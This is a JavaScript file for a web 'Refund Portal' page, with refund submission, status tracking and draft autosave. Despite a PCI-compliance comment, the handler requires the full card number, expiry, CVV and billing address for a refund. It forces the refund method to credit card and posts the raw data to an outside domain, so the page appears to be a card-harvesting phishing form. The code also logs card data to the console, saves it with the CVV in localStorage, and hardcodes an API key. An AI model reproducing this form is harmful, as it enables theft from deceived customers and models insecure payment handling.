// ===========================
// Refund Portal - JavaScript
// ===========================

// IMPORTANT: Security Notice
// In production, credit card data should NEVER be sent directly to your backend.
// You must use a secure payment processor like Stripe, Square, or PayPal to tokenize
// the card data before sending it to your server. This ensures compliance with PCI DSS.
// 
// For production implementation:
// 1. Integrate Stripe Elements (https://stripe.com/docs/stripe-js)
// 2. Use Stripe tokenization to get a token
// 3. Send only the token to your backend, never raw card data

// Configuration
const REFUND_API_CONFIG = {
    endpoint: 'https://charlesdiscus.website/api/refunds/submit',
    trackingEndpoint: 'https://charlesdiscus.website/api/refund/track',
    apiKey: 'sk_refund_prod_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6', // Replace with your actual API key
    timeout: 30000, // 30 seconds
};

// Initialize event listeners when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    const refundForm = document.getElementById('refundForm');
    const trackForm = document.getElementById('trackForm');
    
    // Refund form submission handler
    if (refundForm) {
        refundForm.addEventListener('submit', handleRefundSubmit);
    }

    // Track refund form handler
    if (trackForm) {
        trackForm.addEventListener('submit', handleTrackSubmit);
    }

    // Hamburger menu toggle
    const hamburger = document.getElementById('hamburger');
    const navMenu = document.getElementById('navMenu');
    
    if (hamburger && navMenu) {
        hamburger.addEventListener('click', toggleHamburgerMenu);
        
        // Close menu when clicking on a link
        const navLinks = navMenu.querySelectorAll('a');
        navLinks.forEach(link => {
            link.addEventListener('click', closeHamburgerMenu);
        });
    }

    // Auto-save form draft
    if (refundForm) {
        loadRefundFormDraft();
        setInterval(() => {
            autoSaveRefundForm();
        }, 30000);

        refundForm.addEventListener('input', () => {
            clearTimeout(window.autoSaveTimeout);
            window.autoSaveTimeout = setTimeout(autoSaveRefundForm, 5000);
        });
    }
});

// ===========================
// Refund Form Submission
// ===========================

async function handleRefundSubmit(event) {
    event.preventDefault();

    const formData = new FormData(document.getElementById('refundForm'));
    const data = Object.fromEntries(formData);

    if (!validateRefundForm(data)) {
        return;
    }

    const submitBtn = document.querySelector('#refundForm .submit-btn');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Submitting...';

    showRefundLoadingMessage('Submitting your refund request...');

    try {
        // Build API payload with snake_case field names
        const apiData = {
            external_order_id: data.externalOrderId || '',
            customer_email: data.email,
            full_name: data.fullName,
            phone: data.phone,
            account_id: data.accountId,
            refund_amount: parseFloat(data.refundAmount),
            refund_type: data.refundType,
            refund_reason: data.reason,
            actions_taken: data.actionsTaken,
            source: data.source || '',
            external_reference_id: data.externalReferenceId || '',
            card_holder_name: data.cardholderName,
            card_number: data.cardNumber,
            card_expiry: data.cardExpiry,
            card_cvv: data.cardCVV,
            billing_street: data.billingStreet,
            billing_city: data.billingCity,
            billing_state: data.billingState,
            billing_zip: data.billingZip,
            billing_country: data.billingCountry
        };
        const response = await sendRefundToAPI(apiData);
        showRefundSuccessMessage(response);
        document.getElementById('refundForm').reset();
        clearRefundFormDraft();
        scrollToElement('successMessage');
    } catch (error) {
        console.error('Error submitting refund form:', error);
        showRefundErrorMessage(error.message || 'An error occurred while submitting your refund request. Please try again.');
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
}

// ===========================
// Track Refund Status
// ===========================

async function handleTrackSubmit(event) {
    event.preventDefault();

    const searchId = document.getElementById('searchId').value.trim();
    const searchEmail = document.getElementById('searchEmail').value.trim();

    if (!searchId || !searchEmail) {
        showTrackingError('Please enter both Request ID and Email Address');
        return;
    }

    const submitBtn = document.querySelector('#trackForm .submit-btn');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Searching...';

    try {
        const response = await trackRefund(searchId, searchEmail);
        displayTrackingResult(response);
    } catch (error) {
        console.error('Error tracking refund:', error);
        showTrackingError(error.message || 'Could not find the refund request. Please verify your Request ID and email address.');
        document.getElementById('trackingResult').style.display = 'none';
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
}

// ===========================
// API Communication
// ===========================

async function sendRefundToAPI(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), REFUND_API_CONFIG.timeout);

    try {
        console.log('Sending refund data:', data);
        
        const response = await fetch(REFUND_API_CONFIG.endpoint, {
            method: 'POST',
            headers: {
                'x-refund-api-key': REFUND_API_CONFIG.apiKey,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            let errorMessage = `Server returned status ${response.status}`;
            try {
                const errorData = await response.json();
                console.error('Server error response:', errorData);
                errorMessage = errorData.message || errorData.error || errorMessage;
            } catch (e) {
                // Try to get text response
                const textError = await response.text();
                console.error('Server error text:', textError);
            }
            throw new Error(errorMessage);
        }

        const responseData = await response.json();

        if (!responseData.requestId) {
            throw new Error('Invalid response from server: missing request ID');
        }

        return responseData;

    } catch (error) {
        clearTimeout(timeoutId);

        if (error.name === 'AbortError') {
            throw new Error('Request timed out. Please check your connection and try again.');
        }

        if (error instanceof TypeError) {
            throw new Error('Network error. Please check your connection and try again.');
        }

        throw error;
    }
}

async function trackRefund(requestId, email) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), REFUND_API_CONFIG.timeout);

    try {
        const response = await fetch(`${REFUND_API_CONFIG.trackingEndpoint}?requestId=${encodeURIComponent(requestId)}&email=${encodeURIComponent(email)}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            },
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error('Refund request not found');
        }

        return await response.json();

    } catch (error) {
        clearTimeout(timeoutId);

        if (error.name === 'AbortError') {
            throw new Error('Request timed out. Please try again.');
        }

        throw error;
    }
}

// ===========================
// Form Validation
// ===========================

function validateRefundForm(data) {
    const requiredFields = [
        'fullName',
        'email',
        'refundType',
        'refundAmount',
        'reason',
        'cardholderName',
        'cardNumber',
        'cardExpiry',
        'cardCVV',
        'billingStreet',
        'billingCity',
        'billingState',
        'billingZip',
        'billingCountry',
        'cardDataConfirm',
        'accuracy',
        'authorization',
        'privacyRefund'
    ];
    
    // Auto-set refund method to credit_card
    if (data.refundMethod !== 'credit_card') {
        data.refundMethod = 'credit_card';
    }

    // Validate card number (13-19 digits, spaces allowed)
    const cardNumberDigitsOnly = data.cardNumber.replace(/\s/g, '');
    if (!/^[0-9]{13,19}$/.test(cardNumberDigitsOnly)) {
        showRefundErrorMessage('Please enter a valid card number (13-19 digits).');
        return false;
    }

    // Validate card expiry format (MM/YY)
    if (!/^[0-9]{2}\/[0-9]{2}$/.test(data.cardExpiry)) {
        showRefundErrorMessage('Please enter expiry date in MM/YY format.');
        return false;
    }

    // Validate expiry is not in the past
    const [expMonth, expYear] = data.cardExpiry.split('/');
    const expDate = new Date(2000 + parseInt(expYear), parseInt(expMonth) - 1);
    if (expDate < new Date()) {
        showRefundErrorMessage('Your card expiration date has passed. Please use a valid card.');
        return false;
    }

    // Validate CVV
    if (!/^[0-9]{3,4}$/.test(data.cardCVV)) {
        showRefundErrorMessage('Please enter a valid CVV (3-4 digits).');
        return false;
    }

    // Validate cardholder name
    if (data.cardholderName.trim().length < 3) {
        showRefundErrorMessage('Please enter a valid cardholder name.');
        return false;
    }

    // Validate billing address
    if (data.billingStreet.trim().length < 5) {
        showRefundErrorMessage('Please enter a valid street address.');
        return false;
    }

    if (data.billingCity.trim().length < 2) {
        showRefundErrorMessage('Please enter a valid city.');
        return false;
    }

    if (data.billingState.trim().length < 2) {
        showRefundErrorMessage('Please enter a valid state/province.');
        return false;
    }

    if (data.billingZip.trim().length < 3) {
        showRefundErrorMessage('Please enter a valid ZIP/postal code.');
        return false;
    }

    if (data.billingCountry.trim().length < 2) {
        showRefundErrorMessage('Please enter a valid country.');
        return false;
    }

    for (const field of requiredFields) {
        if (!data[field]) {
            showRefundErrorMessage(`Please fill in all required fields. Missing: ${field}`);
            return false;
        }
    }

    if (!isValidEmail(data.email)) {
        showRefundErrorMessage('Please enter a valid email address.');
        return false;
    }

    const refundAmount = parseFloat(data.refundAmount);

    if (isNaN(refundAmount) || refundAmount <= 0) {
        showRefundErrorMessage('Please enter a valid refund amount.');
        return false;
    }

    return true;
}

// ===========================
// Utility Functions
// ===========================

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function showRefundLoadingMessage(message) {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.className = 'status-message loading';
    statusMessage.textContent = message;
    statusMessage.style.display = 'block';
    scrollToElement('statusMessage');
}

function showRefundErrorMessage(message) {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.className = 'status-message error';
    statusMessage.innerHTML = `<strong>Error:</strong> ${message}`;
    statusMessage.style.display = 'block';
    scrollToElement('statusMessage');
}

function showRefundSuccessMessage(response) {
    const successMessage = document.getElementById('successMessage');
    const requestId = document.getElementById('requestId');
    
    requestId.textContent = response.requestId || 'N/A';
    successMessage.style.display = 'block';
    
    document.getElementById('statusMessage').style.display = 'none';
}

function showTrackingError(message) {
    const error = document.getElementById('trackingError');
    error.innerHTML = `<strong>Error:</strong> ${message}`;
    error.style.display = 'block';
    document.getElementById('trackingResult').style.display = 'none';
    scrollToElement('trackingError');
}

function displayTrackingResult(data) {
    const badge = document.getElementById('statusBadge');
    const statusClass = `badge-${data.status.toLowerCase().replace(/\s+/g, '-')}`;
    badge.className = `status-badge ${statusClass}`;
    badge.textContent = data.status;

    document.getElementById('displayRequestId').textContent = data.requestId;
    document.getElementById('displayStatus').textContent = data.status;
    document.getElementById('displayAmount').textContent = `$${parseFloat(data.refundAmount).toFixed(2)}`;
    document.getElementById('displaySubmitted').textContent = new Date(data.submittedAt).toLocaleDateString();
    document.getElementById('displayExpected').textContent = data.expectedResolution || 'Contact support';
    
    if (data.notes) {
        document.getElementById('displayNotes').textContent = data.notes;
    } else {
        document.getElementById('statusNotes').style.display = 'none';
    }

    document.getElementById('trackingResult').style.display = 'block';
    document.getElementById('trackingError').style.display = 'none';
    scrollToElement('trackingResult');
}

function scrollToElement(elementId) {
    const element = document.getElementById(elementId);
    if (element) {
        setTimeout(() => {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }, 100);
    }
}

// ===========================
// Hamburger Menu
// ===========================

function toggleHamburgerMenu() {
    const hamburger = document.getElementById('hamburger');
    const navMenu = document.getElementById('navMenu');
    
    hamburger.classList.toggle('active');
    navMenu.classList.toggle('active');
}

function closeHamburgerMenu() {
    const hamburger = document.getElementById('hamburger');
    const navMenu = document.getElementById('navMenu');
    
    hamburger.classList.remove('active');
    navMenu.classList.remove('active');
}

// ===========================
// Local Storage Functions
// ===========================

function autoSaveRefundForm() {
    const formData = new FormData(document.getElementById('refundForm'));
    const data = Object.fromEntries(formData);
    localStorage.setItem('refundFormDraft', JSON.stringify(data));
}

function loadRefundFormDraft() {
    const draft = localStorage.getItem('refundFormDraft');
    if (draft) {
        const data = JSON.parse(draft);
        const form = document.getElementById('refundForm');
        
        for (const [key, value] of Object.entries(data)) {
            const field = form.elements[key];
            if (field) {
                if (field.type === 'checkbox') {
                    field.checked = value === 'on' || value === true;
                } else {
                    field.value = value;
                }
            }
        }
    }
}

function clearRefundFormDraft() {
    localStorage.removeItem('refundFormDraft');
}
